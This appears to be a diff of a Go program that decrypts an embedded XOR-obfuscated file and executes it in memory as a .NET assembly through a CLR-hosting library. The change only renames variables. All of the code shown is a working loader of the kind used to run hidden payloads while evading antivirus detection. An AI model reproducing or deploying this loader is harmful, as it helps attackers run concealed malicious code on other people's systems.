@@ -12,20 +12,20 @@ import (
 )
 
 //go:embed file.enc
-var testNetCipher []byte
+var testNetCipherdemo []byte
 
 func main() {
     params := os.Args[1:]
 
-	var testNet []byte
+	var testNetdemo []byte
 
 	key := byte(133)
 
-	for i := 0; i < len(testNetCipher); i++ {
-		testNet = append(testNet, testNetCipher[i]^key)
+	for i := 0; i < len(testNetCipherdemo); i++ {
+		testNetdemo = append(testNetdemo, testNetCipherdemo[i]^key)
 	}
 	// output, _ := LoadBin(testNet, params, "v4.0.30319", true)
-	pRuntimeHost, identityString, _ := clr.LoadGoodClr("v4.0.30319", testNet)
+	pRuntimeHost, identityString, _ := clr.LoadGoodClr("v4.0.30319", testNetdemo)
 	assembly := clr.Load2Assembly(pRuntimeHost, identityString)
 	pMethodInfo, _ := assembly.GetEntryPoint()
 	clr.InvokeAssembly(pMethodInfo, params)
